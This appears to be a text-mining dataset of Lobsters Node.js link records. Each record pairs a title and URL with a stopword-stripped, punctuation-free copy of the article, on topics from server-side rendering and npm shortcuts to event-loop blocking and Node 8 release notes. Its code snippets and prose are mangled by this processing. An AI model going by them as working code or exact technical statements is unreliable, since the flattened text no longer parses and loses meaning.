291,Lobsters,nodejs,Node.js programming,Server Side Rendering with Prefetch,http://blog.bloomca.me/2017/06/11/server-side-rendering-with-prefetch.html,server side rendering prefetch,serverside rendering prerenderer need much better official starter kit good pretty slow webpackprerendererplugin solution reactrouter vue attaching function toplevel component reactrouter vue example problem approach double rendering componentwillmount double rendering implementation reduxtiles prefetch serverside rendering context middleware reduxtiles conclusion,serverside rendering serverside rendering use ssr later sake brevity pretty recent term started life couple year ago initially main problem lack seo complex singlepage application project like prerenderer appeared main idea prerender application somewhere else eg phantomjs waiting execution javascript grabbing html serving later robot approach updated page sometimes maybe background served search engine direct user impacted react came one principle whatever rendered inside able processed server side whatever side actually later allowed write reactnative reactiot renderers became clear possible render content nodejs pas directly user later framework picked idea example vuejs pretty similar concept rendering nowadays ssr considered good practice rather rocket science kind year ago need actually pretty good question crawler much better content parsed anyway computer became much faster well mobile nobody really make dedicated mobile website nowadays except rare specific case also still really good library solution would likely wire thing use boilerplate might bring kind problem also official starter kit facebook contain serverside rendering fuss well crawler actually good google maybe engine even worse better stay safe prerender content also parsing javascript mobile pretty slow delegate work sending javascript parsing executing several possible ajax request fail sloppy network render content mobile instead following make request server perfect bandwidth perform initial render server send plain html javascript send javascript full cycle descibed go user get html first app javascript start parse execute javascript application unresponsive point obvious downside worked around extent remembering user interaction still ability see important content fast priceless desktop important cpu much faster usually nice addition need serverside rendering need seo definitely big bonus need seo take look webpackprerendererplugin performance critical rendering path crucial would recommend taking look amount user mobile device try analyze network user use application lowend device possible usage mobile network would definitely recommend give try also one best test scenarious actually get real android phone use application discover interesting thing never thought solution mentioned area still uncharted real best practice boilerplate provide serverside rendering usually go far rendering application without prefetching without offering way basically step server code part invokes something like rendertostring starting assume talking react reactrouter possible achieve let say vue familiar react also approach know good idea frontend world immediately copied happened virtual dom attaching function toplevel component moment rendering actually invoke rendertostring know component going render lead u first guess know component attach function resolve needed data router know exactly route going receive add needed query function moreover official recommendation reactrouter vue sequence follows match suitable component toplevel component defined router map filtering whether function fetch data invoke function waiting execution stringify state send client client restore state request fired please note request try invoked client without caching mechanism pretty useless sent html rendered data client refetch data user see blinking content loader data really want provide code reactrouter changed api quite bit lot project still use older version example idea clear problem approach biggest downside coupling toplevel component know much get needed data route make sense beginning application grows become complicated also possible component stop rendered inside another component toplevel continue fetch data possible person change nested component aware exact prefetch also essentially duplicate code need prefetch inside component client likely fetch inside nested component multifile nature really easy make outofsync completely accidentally possible work around though basically resolve component inside function make problem fetching unnecessary data much easier another problem arises though pas correct prop nested component tradeoff make also solve code duplication problem lack common solution problem show easy generalize people stick writing custom function specific route double rendering render react application server one lifecycle hook invoked componentwillmount use constructor matter invoked client server please note componentwillmount invoked server request fire performed even wait anything still executed general rule better put request componentdidmount idea following render application first without saving rendered output componentwillmount hook executed somehow catch wait resolving safely render application fullfilled data approach much simpler execute application several time almost solves problem previous approach coupling also componentwillmount invoked client side content biggest drawback specify request single place get hook component rendered component presented missing data mean prefetch data general abstracting coupling know many time render application everything would prefetched another tradeoff make usually dry render enough depends application double rendering triple course drawback cpu conceptual problem code count big problem double rendering implementation experienced approach generalized much better previous one library reduxtiles provide exactly approach prefetch serverside rendering main idea would like catch asynchronous request wait render final output create object store request pas async action pretty annoying also requires u rewrite data layer part react redux application two place instantiate independent perrequest object context middleware first approach require u pas object action syntax get context convenient ending one possibility middleware middleware redux allows u handle different dispatched action type reduxtiles middleware handle returned function pass object promise asynchronous tile think redux module keep request remove resolving allows u grab active promise wait conclusion see question answer topic feel serverside rendering prefetching critical actually try different approach maybe route component easily serve smart component know everything underlying page maybe make sense use latter approach weigh tradeoff
292,Lobsters,nodejs,Node.js programming,Code Cracked for Code-Splitting + SSR in Reactlandia: React Loadable + Webpack Flush Chunks and more,https://medium.com/@faceyspacey/code-cracked-for-code-splitting-ssr-in-reactlandia-react-loadable-webpack-flush-chunks-and-1a6b0112a8b8,code cracked codesplitting ssr reactlandia react loadable webpack flush chunk,next cs extract cs chunk webpack plugin cssinjs waste cacheable hmr chunkify cs give smallest possible initial j bundle support hmr use shit flush chunk webpack flush chunk use shit react universal component readme dynamic like vue could even asynconly component async reactor evolution universal rendering extract cs chunk webpack plugin use function prop passed arg determine data fetch dynamically async reactor getinitialprop asynconly primary use case package well conclusion use shit p important supposed modern nonrestricting reactnpm developer experience serious apps idiomatic javascript reactlandia read,next csswell quite also cs lot opinion one save readme extract cs chunk webpack plugini also answer boil fact using cs module already cssinjs wasting cycle client server rendering cs waste cacheable stylesheets cacheable hmr mustand guess chunkify cs like j need generate renderpath cs send least amount byte wire fact send le see truer cssinjs solution like styletron aphrodite etc cs represented code anyway aka javascript may sending smallest amount cs possible sending form javascript addition matter whatit also turn statically chunkify cs achieved rule achieved sweetspot optimization little cs send wire see real problem example sending cs private user panel publicfacing site vice versa many sectionspanels cs exponentially grows sent everywhere however straightforward mechanism breakup cs chunk section solved problem moreagain read extract cs chunk webpack plugin readme lot thought boil static determination cs send damn good solution going last sacrificing render cycle use custom hocs imho nitpicking result diminishing returnsdid mention fact request async chunk chunk cs ready injection embedded javascript see creates two j chunk one without cs sent initial request along real stylesheets another async request cs injection usual give smallest possible initial j bundlesdid mention unlike original extract text webpack plugin support hmr use shit moreyes got wan na make async component neither react loadable react universal component serf need well core aspect universal rendering goodness abstractedextracted package make flush chunk along webpack flush chunk easily react loadable react universal componentthis time really say anymore use shit react universal componentbut let get ahead lot put react universal component make beallendall calling universal component react loadable kicked as spiritual successor basically everything sun pr issue package etc included discretion course trying think noteworthy capability point reading readme probably best thing well let look code import universal reactuniversalcomponent const universalcomponent universal import foo loading loading error error timeout mindelay chunkname mychunkname onload module replacereducers reducer modulebar key foo module modulefoo path pathjoin dirname foo resolve requireresolveweak foo export default isloading error div universalcomponent isloading isloading error error div et voila argument api like nextjs dynamic option argument super clean surface like vue also inspired react loadablenot option required fact optional could even asynconly component read end readme thanks async reactor may well basis even evolution universal renderingthere still lot meet eye one wrap resulting universal component hoc datafetching ie separate async work reuses loading component dry via isloading prop etc make perfect match apollo likeboth promise run parallel loading spinner showyou use onload utilize export module related work replacing reducer updating saga perhaps something animation etcif reached error component show thank vuethe mindelay different react loadable result responsive component instead waiting m see anything always show spinner immediately set minimum amount time async component show also help animation say page spinner slide sliding animation take well youcan avoid rendering jank messing sliding animation prolonging page update sliding animation done also better solves original problem avoiding flashing loading spinner component since matter could appear around time without minimum delay control readme covered well top headit support hmr react loadable yet attain async cs using extract cs chunk webpack pluginlastly instead restricted promise import use function call requireensure callback give additional capability requireensure actually stuff async reactor including datafetching importantly prop passed arg determine data fetch dynamically story another day checkout async reactor review stuff even familiar react loadable checked likely throw loop good way interface proposed async reactor lot potential becoming idiomatic future combination asyncsync universal renderingbasically potential greater npm community answer nextjs getinitialprops recursive promise resolution system like apollo read end readme hear go think futureand mention use severrendered scenario shine read readme compare async reactor pretty cool thing async component argument asynconly primary use case package wellconclusionuse shit far read readmes many base covered goodbyepsdid mention webpack magic comment feature came fully supported well use name chunk call flushchunknames instead flushmoduleids pas chunknames universal asyncwork chunknames make work save server cycle jump hoop crossreference module id statsrichard scarrott webpackhotservermiddleware hmr server world class examine usage boilerplate important related supposed modern nonrestricting reactnpm developer experience serious apps boilerplate might add pristine developer experience goodness everywhere hopefully find idiomatic enjoy idiomatic javascript reactlandia read tweet love much appreciated find twitter faceyspacey want stay current reactlandia tapclick follow next faceyspacey publication receive weekly medium letter via email
293,Lobsters,nodejs,Node.js programming,Node v8.1.0 Released,https://nodejs.org/en/blog/release/v8.1.0/,node released,async hook dependency file system inspector zlib assert assert semverminor asynchooks asynchooks http asyncwrap build build build crypto deps deps deps deps deps nodejsiojs deps iojsiojs deps iojsiojs deps deps deps dns dns doc doc doc doc doc doc doc doc doc doc doc doc doc doc doc doc doc doc doc doc doc doc doc doc doc doc doc doc doc stream error tty event semverminor f f semverminor f gitignore semverminor http http http http semverminor inspector inspector inspector semverminor inspector semverminor lib lib napi net openssl iojsiojs process readline src src src test test test test test test test test test test test test test test test test test test test test test test test test test test test f test module tool tool tool tool test url url url util win doc zlib semverminor zlib semverminor zlib http http http http http http http http http http http http http http http http http http http http,async hook one promise lead creation new promise parent promise identified trigger dependency file system inspector possible bind random port using zlib regression zlib module made impossible properly subclass zlibdeflate zlib class fixed assert fix deepequal similar set map bug joseph gentle assert fix deepequal rangeerror maximum call stack size exceeded rmdm semverminor asynchooks use parent promise triggerid jialipassion asynchooks http fix socket reuse agent anna henningsen asyncwrap run destroy uvtimert trevor norris build use existing variable reduce complexity bryce baril build streamline j test suite makefile rich trott build fix typo nikolai vavilov crypto clear err stack ecdh buffertopoint ryan kelly deps upgrade libuv cjihrig deps upgrade npm kat deps update openssl asm asmobsolete file daniel bevenius deps update openssl config file daniel bevenius deps add norandscreen openssl sclient shigeki ohtsu nodejsiojs deps fix asm build error openssl shigeki ohtsu iojsiojs deps fix openssl assembly error fedor indutny iojsiojs deps copy openssl header file include dir daniel bevenius deps upgrade openssl source daniel bevenius deps float patch npm fix citgm myles borins dns use faster ip address type check result brian white dns improve callback performance brian white doc update linux supported version cjihrig doc add url argument httphttps request vladimir trifonov doc fix typo ndapi napimd jamen marz doc add ref option enable napi michael dawson doc fix nit code example asynchooksmd vse mozhet byt doc use preferrestparams eslint rule doc vse mozhet byt doc resume stream pipe unpipe matteo collina doc add missing backticks docapitlsmd paul bininda doc update cc asynchooks anna henningsen doc suggest xcodeselect install gibson fahnestock doc add require module urlmd daijiro wachi doc add objectcurlyspacing doceslintrc vse mozhet byt doc unify space object literal vse mozhet byt doc use destructuring code example vse mozhet byt doc fix code example zlibmd vse mozhet byt doc update cc napi michael dawson doc add missing make command upgradingmd daniel bevenius doc refine space example vmmd vse mozhet byt doc fix link james please doc add asynchooks napi tocmd allmd vse mozhet byt doc remove writingtestsmd michael dawson doc fix date changelog myles borins doc asynchooks documentation thorsten lorenz doc add tniessen collaborator tobias doc modernize fix code example utilmd vse mozhet byt doc fix code example urlmd vse mozhet byt doc fix typo napimd jongchan choi doc fix doc style daijiro wachi doc stream clarify data pipe readable matteo collina error tty migrate use internalerrorsjs gautam mittal event fix potential permanent deopt brian white semverminor f expose stats time number refael ackermann f replace bind toplevel function matteo collina semverminor f promisify exists correctly dan fabulich gitignore add libuv book github template cjihrig semverminor http overridable keepalive behavior agent fedor indutny http assert parserconsume argument type gireesh punathil http describe parse err debug output sam robert http suppress data event req aborted yihong wang semverminor inspector allow inspecthost port j sam robert inspector allows reentry paused eugene ostroukhov inspector refactor rename comment method sam robert semverminor inspector bind random port ben noordhuis semverminor lib return netsocketend sam robert lib iff changed jacob jones napi enable napiwrap work object jason ginchereau net fix permanent deopt brian white openssl fix keypress requirement apps shigeki ohtsu iojsiojs process fix permanent deopt brian white readline clean event listener onnewlistener gibson fahnestock src remove print modifier refael ackermann src remove processinspectorenbale cjihrig src added newline help message josh ferge test refactor testdgramoobbuffer rich trott test pas env var testbenchmarkhttp gibson fahnestock test validate full error message aniketshukla test increase coverage asynchooks david cai test fix build warning addonsnapitestobject jason ginchereau test consolidate napi test addons michael dawson test rearrange inspector header convention sam robert test improve async hook test error message anna henningsen test test asynchook triggerid property test add documentation commonmustnotcall rich trott test check destroy hook called exit anna henningsen test make testfswatchfile reliable rich trott test check inspector support testinspector daniel bevenius test add knowntest request unicode url david lowe test improve dns internet test case brian white test improve testhttpsserverkeepalivetimeout rich trott test mark inspectorportzerocluster flaky refael ackermann test consolidate napi test addons michael dawson test refactor testnetserverbind rich trott test use mustcall testreadlineinterface rich trott test fix flaky testfswatchfile macos rich trott test use mustnotcall rich trott test make napi weakref gc test asynchronous jason ginchereau test improve napi coverage typed array michael dawson test support candidate version michaã l zasso test hascrypto httpsserverkeepalivetimeout daniel bevenius test f test fswatch filename refael ackermann test module make message check mui dependent refael ackermann tool fix order eslint rule michaã l zasso tool fix node args passing test runner brian white tool explicit including keyid myles borins tool test update testnpmpackage path gibson fahnestock url update idna handling timothy gu url pas whatwg host httprequest tobias url precise urlsearchparams constructor timothy gu util refactor format methodperformance improved jesus seijas win doc document perdrive current working dir bartosz sosnowski zlib revert back function james snell semverminor zlib expose amount data read engine alexander omara semverminor zlib option engine convenience method alexander omara window installer http window installer http window binary http window binary http macos installer http macos binary http linux binary http linux binary http linux ppc le binary http linux ppc binary http linux binary http aix binary http smartos binary http smartos binary http binary http binary http binary http source code http release file http documentation http begin pgp signed message hash begin pgp signature bysf end pgp signature
294,Lobsters,nodejs,Node.js programming,Node.js 8: Big Improvements for the Debugging and Native Module Ecosystem,https://medium.com/@nodejs/node-js-8-big-improvements-for-the-debugging-and-native-module-ecosystem-58454861f2fc,nodejs big improvement debugging native module ecosystem,nodejs big improvement debugging native module ecosystem lts strategy native modular ecosystem get boost nodejs api napi welcome turbofan ignition nodejs core technical committee ctc chose postpone buffer improvement whatwg url parser stable performance security interface boost npm recently announced release version insight tooling ecosystem debugging improved support promise,nodejs big improvement debugging native module ecosystemwe excited announce nodejs today new improvement feature release create best workflow nodejs developer date highlighted update feature include adding nodejs api native module developer asynchooks j binding inspector zerofilling buffer utilpromisify morethrowing confetti nodejs nodejs release replaces version current release line nodejs release line become nodejs long term support lts release october detail lts strategy lts release line focused stability security best want guaranteed stability upgrade andor using nodejs enterprisethose need stability complex production environment ie medium large enterprise wait nodejs go lts upgrading productionnow provided psa let dive interesting update releasenative modular ecosystem get boostthe much awaited nodejs api napi added experimental feature release behind flag incredibly important technology eliminate breakage happens major release line native modulesalthough native module module written c c directly bound chrome small portion massive modular ecosystem percent module rely indirectly native module every time nodejs major release update package maintainer update dependenciesthese effort would possible without significant contribution google ibm intel microsoft nearform nodesource individual contributor read full detail around effort technology hereanyone build us native module test napi featurewelcome ship significant update javascript runtime includes major improvement performance developer facing apis guaranteed forward abi compatibility upcoming help ensure stability nodejs native addon ecosystem nodejs lifetime nodejs project plan move possibly engine also help set pending transition new turbofan ignition compiler pipeline lead lower memory consumption faster startup across nodejs application although existed previous version turbofan ignition enabled default first time new compiler pipeline represents significant change nodejs core technical committee ctc chose postpone nodejs release order better accommodate itbuffer improvementsthe zerofilling buffer num new buffer num added default benefit zerofilling buffer help security privacy prevent information leak however downside buffer folk using take performance hit avoided migrating bufferallocunsafe suggested nodejs user use function aware risk know avoid problemswhatwg url parser stablewhatwg url parser go experimental status fully supported version allowing people use url parser compliant spec compatible browser new url implementation match url implementation api available modern web browser like chrome firefox edge safari allowing code using url shared across environmentsperformance security interface boost npm inc recently announced release version npm client happy include new version within nodejs package management task package installation version update five time faster lockfiles ensure consistent installation across development environment selfhealing cache automatic error recovery protects corrupted downloads npm also introduces code verification since npm first shipped nodejs mission reduce friction nodejs developer help people build amazing thing using nodejs npm make modular software development dramatically faster easier largest performance improvement ever said isaac z schlueter ceo npm inc proud commitment nodejs community collaboration bring innovative product market excited see come next insight tooling ecosystem debuggingthis release line provide deep insight via new tracing async tracking feature experimental asynchooks module formerly asyncwrap received major update nodejs diagnostics api allows developer monitor operation nodejs event loop tracking asynchronous request handle complete lifecycle enabling better diagnostic tool utilitiesthese addition along removal legacy debugger replaced newer cli debugger landed make easier debug track change within nodejs allowing commercial open source tooling vendor pinpoint performance degradation nodejs applicationsanother experimental feature added release includes j binding inspector new inspector core module enables developer leverage debug protocol used chrome inspector order inspect currently running javascript codeimproved support promisesnodejs includes new utilpromisify api allows developer wrap callback apis return promise little overhead using standard apifor major update please go technical blog read
295,Lobsters,nodejs,Node.js programming,8 npm Tricks You Can Use to Impress Your Colleagues,https://medium.com/@adiramsalem/8-npm-tricks-you-can-use-to-impress-your-colleagues-dbdae1ef5f9e,npm trick use impress colleague,basic shorthand getting started installing package installing package globally installing package save dependency installing package save devdependency shorthand list initializing new package running test list available script list installed package running locallyinstalled executables find package internet npmjscom run script script bumping package version semver,watch colleague coding shorthand trick applied somehow familiar mind blow away happens u timein short post unveil useful npm trick many cover chose focus relevant useful daytoday workflow developersbasic shorthand getting startedto get everyone aligned especially newcomer among u let quick overview basic shorthand make sure nobody miss anything trivialinstalling package regular npm install pkg shorthand npm pkginstalling package globally regular npm global pkg shorthand npm g pkginstalling package save dependency regular npm save pkg shorthand npm pkginstalling package save devdependency regular npm savedev pkg shorthand npm pkgfor additional shorthand read npm shorthand listlet begin interesting stuff initializing new packagewe know npm init first thing creating new packagebut question quite annoying gon na modify anyway avoid npm init npm init f rescue running testsanother command use npm test u use every day several time daywhat told le character use much nice winfortunately npm exactly list available scriptswe get new project wonder get started usually ask thing like run script available one way discover open packagejson file check script sectionwe better course simply run npm run get list available scriptsadditional option install ntl npm g ntl run ntl project folder also allows run script make list installed packagessimilar available script sometimes ask dependency projectwe open packagejson file check already know bettermeet npm l depth list globallyinstalled package run g flag npm l g depth running locallyinstalled executableswe installed package project come executable work run via npm script wonder overcome first let understand execute command terminal actually happens look executable name path listed path environment variable magically available anywhere locallyinstalled package register executables locally listed path foundhow work run executables via npm script ask good question running way npm little trick add additional folder path projectdirectory nodemodulesbinyou see running npm run env grep path also run npm run env see available environment variable npm add interesting stuffnodemodulesbin wondered exactly locallyinstalled package place executableslet run nodemodulesbinmocha project directory see actionsimple right run nodemodulesbin command whenever want run locallyinstalled find package internetyou might came across repository entry packagejson file wondered good answer simply run npm repo watch open browser applies way npm home command homepage entryif want open package page npmjscom nice shorthand well npm run script scriptsyou probably familiar script pretest allows define code would run test scriptwhat might surprised find pre post script every script including custom script useful project use npm build tool many script need bumping package versionyou package use semver versioning need bump version new releaseone way open packagejson file change version manually thatan easier way run npm version major minor patch
296,Lobsters,nodejs,Node.js programming,Breaking the Node.js event loop,https://blog.scottnonnenberg.com/breaking-the-node-js-event-loop/,breaking nodejs event loop,talk seattle nodejs meetup code direct link original screencast original dangerous cliff nodejs post thread semaphore deadlock nodejs locking midexecution interruption toolong task short script interval mitigation use sync method fsreadfilesync use limit incoming data express middleware limit parameter use stream stream jsonformatted data html keep long task event loop work queue r julia separate process many task next script mitigation detect health trend reject new work heavy load middleware reject new request thing looking good set loadbalancer try another node break learn neil degrasse tyson said,video taken part talk seattle nodejs meetup code direct link original screencast original dangerous cliff nodejs post asynchronous programming difficult wrap mind around thread semaphore deadlock oh one hand nodejs make whole lot easier locking midexecution interruption event loop foreign territory let explore poking prodding let try break toolong task first way break event loop execute task take long take look short script var f require f var dosyncwork function var start new date var new date consolelog dosyncwork start nowgettime startgettime new date consolelog dosyncwork done var getfile function var start new date consolelog getfile start fsreadfile nonexistent function var new date var delta nowgettime startgettime consolelog getfile done delta m var previous var writeinterval function var delta var new date previous delta nowgettime previousgettime consolelog writeinterval delta delta m previous setinterval writeinterval settimeout getfile settimeout function getfile dosyncwork settimeout function processexit set interval fire every logging long since last call run getfile go disk asynchronously print long took finally call getfile immediately call dosyncwork evil function take one whole second synchronous work let run writeinterval writeinterval getfile start getfile done writeinterval writeinterval getfile start dosyncwork start dosyncwork done writeinterval getfile done writeinterval writeinterval writeinterval writeinterval key thing note first initial getfile call take go filesystem return result next first couple writeinterval call spaced little bit requested sign healthy event loop always ready take new task get interesting around dosyncwork call first note writeinterval call happen synchronous work skipped entirely second getfile call take finish started event loop blocked finish event loop available key note also happens server one visitor nodejs server able get long task onto event loop request delayed like getfile unlike ruby rail separate thread per request nodejs server allows one operation monopolize resource process mitigation use sync method first step avoid using synchronous method like fsreadfilesync block code entire process requested file returned say warned sync name use limit incoming data data come sort place apis call customer uploads data store control use express middleware limit incoming data provide limit parameter request data use stream avoid large payload use stream break one big task smaller task even task might assume require data like working jsonformatted data html keep long task event loop avoid sort long computation set sort work queue manage work happen consider using something wellsuited scenario especially computation involved like r julia might happen machine via separate process best bet include worker machine greater scalability many task way break event loop put many task onto server may working task quickly many next script little complicated designed replicate server load var async require async var toobusy require toobusyjs var launchdelay var syncwork var taskdelay var concurrent var completed var dosyncwork function var start new date var new date nowgettime startgettime syncwork new date var dotask function concurrent settimeout function concurrent completed dosyncwork taskdelay var writestatus function consolelog lag toobusylag consolelog concurrent concurrent consolelog completed completed completed setinterval writestatus var previous var go function settimeout function var new date var count previous var delta nowgettime previousgettime count mathfloor delta launchdelay var count dotask previous go launchdelay go two key variable look launchdelay syncwork quick math see request per second taking work add work per server able handle load confirmation lag concurrent completed lag concurrent completed lag concurrent completed lag concurrent completed lag concurrent completed lag concurrent completed c server keeping getting work done lag time take get even loop quite low change launchdelay doubling load request per second amount work per let watch process struggle lag concurrent completed lag concurrent completed lag concurrent completed lag concurrent completed lag concurrent completed lag concurrent completed lag concurrent completed c healthy event loop every iteration getting slower process never get chance catch breath constant influx new task happen nodejs server heavy load getfile call first script take second server long take get event loop interaction independent user request happen single nodejs process mitigation detect health trend anything potential load issue never saw coming first thing install sort process health monitor event loop like sending data toobusyjs statsdgraphite regular interval information hand add capacity thing start fall apart reject new work heavy load sadly never predict massive influx traffic saw nodejs process grind halt high load even new node starting come online share burden use toobusyjs build middleware reject new request thing looking good set loadbalancer try another node get kind busy response break learn breaking something important truly understanding neil degrasse tyson said child born scientist always turning rock plucking petal flower always stuff large destructive exploration really think adult scientist kid never grew adult scientist software perfect playground take real effort produce impactful negative consequence experimentation need replace broken egg clean mess pain injury revert change source code restore data backup break event loop know happens forget callback call twice test apps load experiment get better designing system debugging
297,Lobsters,nodejs,Node.js programming,Schemats v2.0 - TypeScript interface generator for Databases now supports MySQL!,https://github.com/SweetIQ/schemats,schemats typescript interface generator database support mysql,schemats statically typed postgresql query typescript quick start installing schemats generating type definition schema generating type definition table postgres schema using schematsjson config file writing code typed schema using schemats library upgrading deprecation namespace typescript documentation support strict nullchecking support strict nullchecking,schemats using schemats generate typescript interface definition postgres mysql sql database schema automatically start database schema user idserial usernamevarchar passwordvarchar lastlogontimestamp automatically following typesscript interface generated interface user id number username string password string lastlogon date overview motivation rational behind project please take look statically typed postgresql query typescript quick start installing schemats npm install g schemats generating type definition schema schemats generate c postgres postgres localhostosm user osmts schemats generate c mysql mysql localhostosm user osmts command generate typescript interface osm database table user resulting file stored osmts generating type definition table postgres schema generate type definition table within schema public note mysql default public schema schema named public still work schemats generate c postgres postgres localhostosm public osmts schemats generate c mysql mysql localhostosm public osmts neither table parameter schema parameter provided table schema public generated command equivalent schemats generate c postgres postgres localhostosm osmts schemats generate c mysql mysql localhostosm osmts using schematsjson config file schemats support reading configuration json config file default schematsjson instead passing configuration via commandline parameter like done also possible supply configuration config file config file support parameter commandline argument example schematsjson exists current working directory following content conn postgres postgres localhostosm table user running schemats generate equivalent running schemats generate c postgres postgres localhostosm user osmts writing code typed schema import osmts directly import osm namespace osmts import osm osm query pgpromise completely typed return value let array osmusers await dbquery select user creationtime decide get selected field let array email osmusers email creationtime osmusers creationtime await dbquery select email creationtime user creationtime generated type definition database schema write code autocompletion static type check using schemats library schemats expose two highlevel function generating typescript definition database schema used build tool grunt gulp upgrading deprecation namespace version deprecates generating schema typescript file namespace instead generating schema typescript file schemats generate c postgres postgres localhostdb n yournamespace dbts import import yournamespace db encouraged generate without namespace schemats generate c postgres postgres localhostdb dbts import import yournamespace db import tablea tableb db typescript documentation describes top level namespace needle discussed generating schema typescript file namespace still work discouraged subjected removal future support strict nullchecking version support strict nullchecking reflects null constraint defined postgresql schema
298,Lobsters,nodejs,Node.js programming,Hard-won lessons: Five years with Node.js,https://blog.scottnonnenberg.com/hard-won-lessons-five-years-with-node-js/,hardwon lesson five year nodejs,nodejs shared story basic concept tricky bit class scraper power ecosystem coffeescript verify assumption nan equal anything else sort needed transitivity strong guarantee incoming data check result calculation logic callback submitted pull request ultimately reimplemented released architecture blocking event loop singlepage web application spa reactjs synchronous work bring nodejs server knee gatsby jadepug graphql dale bustad rapscallion redfin implicit dependency express middleware data apis version data mongodb javascript mutable object document store provisioning pay close attention testing testing absolutely totally necessary lowhanging fruit jshint learn use eslint effectively flow test cleanup classic code review mistake sinon sandbox mutability jenkins immutablejs silently fails try change thing interested elixir elixir ecosystem dependency version tool based gatsby blog git use specific version number webpack language feature dependency unbounded subdependency pulling toonew version yarn continuous integration ci documentation version asyncjs time right front page github project new relic get new relic rail way integrates express asynchronous call average bad way represent realworld data learned well memory emotional event retained clarity detail,five year working nodejs learned lot already shared story time wanted focus one learned hard way bug challenge surprise lesson apply project basic concept new platform share tricky bit point concept secondnature digging bug caused good way ensure learn even bit painful class first getting started nodejs writing scraper take long realize something make whole lot request parallel alone important discovery since yet fully internalized power ecosystem sat wrote parallelism limiter worked made sure never n request progress given time later needed introduce second area parallelism limit app ensure pulled information n user time started running really weird problem introduced second instance class process log make sense eventually realized coffeescript class property syntax give new array every instance one shared across coming objectoriented language used class fully understand coffeescript language construct producing behind scene learn tool well verify assumption nan contract implemented sort based user preference would apply throughout multistep workflow seeing really weird behavior order stay sending set user preference every time order item changing confused supposed deterministic data data initial investigation find anything finally added extremely verbose logging nan showed previous calculation created wreaking havoc sort algorithm equal anything else broke sort needed transitivity careful javascript math operation better strong guarantee incoming data check result calculation logic callback working one postgresconnected personal apps noticed strange behavior test failed initial test failure rest test would time happen often test fail often starting get annoying decided dig code using pg node module delved nodemodules directory started adding logging discovered pg needed internal cleanup request complete calling userprovided callback exception thrown code skipped therefore pg bad state ready next request submitted pull request ultimately reimplemented released get habit calling callback last statement function also good idea prefix return statement sometimes last line always last thing architecture individual line code bug whole lot painful design application blocking event loop contract asked take existing singlepage web application spa built reactjs make render server fixing area assumed running inside browser working painfully aware synchronous work bring nodejs server knee added new datapoint stats collection server long page taking render data started roll became clear thing good shape easy set page taking render far far long production server gatsby experience prepared well next step rendering static file think really hard asking nodejs server synchronous work really bad news rendering html lot synchronous work slow thing reactjs also lightweight tool like jadepug even typechecking phase large graphql payload take lot synchronous time reactjs specifically dale bustad rapscallion promising approach splitting synchronous work render react component tree string redfin reactserver another heavyweight attempt improve implicit dependency already speed contract implementing feature good clip told next feature could refer another one nodejs apps help implementation jumped took look express middleware function endpoint question found whole lot reference reqrandomthing even reqrandomfunction call proceeded search back every single middleware function run figure exactly going make dependency explicit unless absolutely necessary otherwise example instead adding localespecific string reqmessages pas reqlocale directlyaccessed var getmessagesforlocale require getmessages explicitly see code relies go way developer randomthingjs certainly like know part project using code data apis version client wanted add feature nodejs api acting backend many installed native apps tablet phone quickly discovered add field apps coded defensively first action incoming payload strict schema verification given application became clear needed two new type versioning one surface api client could upgrade get access new feature data ensure could reliably implement new feature top mongodb work add application reflected development first version must gone something javascript mutable object get people excited document store create kind object code let store somewhere sadly people seem leave writing initial app think second third fourth version learned use postgres think versioning first version provisioning senior nodejs expert large contract project devops expert came talk production setup taking long time get new machine provisioned datacenters wanted make sure plan sound appreciated nodded head said running single nodejs process per server stopped mentioned server four physical core explained one core would used per server shrugged kind server could get primarily net shop standard way thing introduced cluster long tough one get head around coming platform nodejs one thread whereas every mainstream web server platform scale server add core use cluster pay close attention magical solution testing written lot javascript learned testing absolutely totally necessary really lowhanging fruit client explained nodejs expert departed replacement big plan project primary topic discussion started forthright situation realized thing good shape wanted thing right time disappointed level test coverage least test happy see jshint already place sure audit current ruleset surprised see unused option turned turned shocked sheer number new error spent hour deleting code coding javascript difficult tool make bit reasonable learn use eslint effectively little bit annotation flow help catch function called improperly lot value minimal effort test cleanup asked help developer figure test failure coming test run looked test output coming mocha could see error firing given error looked closely callstack became clear error coming code totally unrelated test question upon deeper investigation discovered previous test claimed finished successful also kicked set async operation exception thrown code interpreted mocha processlevel handler belonging activelyrunning test investigation found mocking also cleaned leaking test using callback need end test done easy code review kind function nesting test probably done bit tricky though call done initially provide function one classic code review mistake also use sinon sandbox feature help ensure thing put back place test finish mutability standard way thing contract project run unit test integration test separately least local development jenkins would full test run covering set test one pull request introduced couple new test failed jenkins confused test passed locally fruitless wonderings flipped highdetail mode ran exact command knew jenkins using run test took able replicate issue mind reeled trying figure different run nothing verbose logging rescue two long run later could see difference run couple false start right logging place became clear unit test modified key application data used integration test kind bug extremely difficult track though proud found bug find interested immutability immutablejs nice drop lodash seamlessimmutable silently fails try change thing work production see interested elixir data elixir always immutable ecosystem much getting good nodejs simply working larger ecosystem effectively choosing good dependency managing well dependency version use tool based webpackstaticsitegenerator gatsby generate blog part preparing git repository public release deleted nodemodules directory installed scratch usually work since use specific version number packagejson time thing stopped working stopped working weirdest way useful error message kind contributed number pull request gatsby knew codebase pretty well first step jump add key logging statement error message trouble interpreting though dug webpackstaticsitegenerator discovered us webpack create big bundlejs application code proceeds run nodejs crazy error came deep inside file run nodejs hot trail minute specific bit code attach error message initially needed dig find dependency new language feature running nodejs version turned dependency unbounded subdependency pulling toonew version punycode lock entire dependency tree specific version yarn lock direct dependency specific version know dependency tooloose dependency version could still get situation time upgrade small change one time far easier investigate thing go wrong install upgrade small number dependency time use continuous integration ci server frequent fromscratch installation node module documentation version using asyncjs one project specifically filterlimit function list path wanted go filesystem grab trait file would determine path would remain list wrote filter method normal async way standard callback err result async signature thing working went documentation time right front page github project looked entry filterlimit signature expected callback err result went back project ran npm outdated recent going upgrade full npm info async see whether latest version still confused went back code added extremely verbose logging dice finally went asyncjs source github stupid function realized happened master branch github code wanted documentation installed version would look back history discovered proper signature callback result ability propagate error pay close attention version number documentation reference easy get lazy since first documentation encounter often work method changed lately latest version doublecheck new relic get tasked digging deep performance nodejs server client gave access monitoring tool new relic used new relic monitoring client rail app year previous done new relicnodejs feasibility analysis another client knew generally system worked knew way integrates express asynchronous call started surprisingly comprehensive trace incoming request handled express middleware run call server looked everywhere find key processlevel metric health event loop worked around manually sent metric toobusyjs new relic created new chart based additional data confidence analysis sure enough spike event loop latency number coincided spike new relic call time spent request dug disturbing realization number hold together total time spent request line item inside trace add sometimes category tried clean thing time use new relic monitor nodejs apps understanding nodejs event loop stacked average time spent chart absolutely misleading given slow event loop highlighted endpoint one defer event loop new relic detect problem help track problem actually need 